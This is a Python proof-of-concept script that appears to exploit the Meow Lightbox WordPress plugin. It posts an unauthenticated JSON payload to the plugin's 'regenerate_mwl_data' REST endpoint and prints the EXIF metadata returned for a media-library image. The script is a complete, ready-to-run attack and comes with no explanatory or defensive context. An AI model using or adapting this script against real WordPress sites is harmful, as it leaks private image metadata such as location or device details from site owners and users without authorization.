import requests
import json

# ========== CONFIG ==========
TARGET = "http://localhost/wordpress"
IMAGE_URL = "http://localhost/wordpress/wp-content/uploads/2025/06/beluga1.jpg"
# ============================

ENDPOINT = f"{TARGET}/wp-json/meow-lightbox/v1/regenerate_mwl_data"

payload = {
    "images": [
        {"url": IMAGE_URL}
    ]
}

headers = {
    "Content-Type": "application/json"
}

print("[*] Sending payload to:", ENDPOINT)
response = requests.post(ENDPOINT, headers=headers, data=json.dumps(payload))

if response.status_code == 200:
    print("[+] Server responded with 200 OK")
    data = response.json()
    if data.get("success") and data.get("data"):
        for image_data in data["data"]:
            print(f"\n[Image] {image_data['url']}")
            print(f"  - Attachment ID: {image_data['id']}")
            print("  - Extracted EXIF data:")
            for key, val in image_data["data"].items():
                print(f"    {key}: {val}")
    else:
        print("[!] No EXIF data returned or image not found in Media Library.")
else:
    print(f"[!] Failed. Status code: {response.status_code}")
    print(response.text)
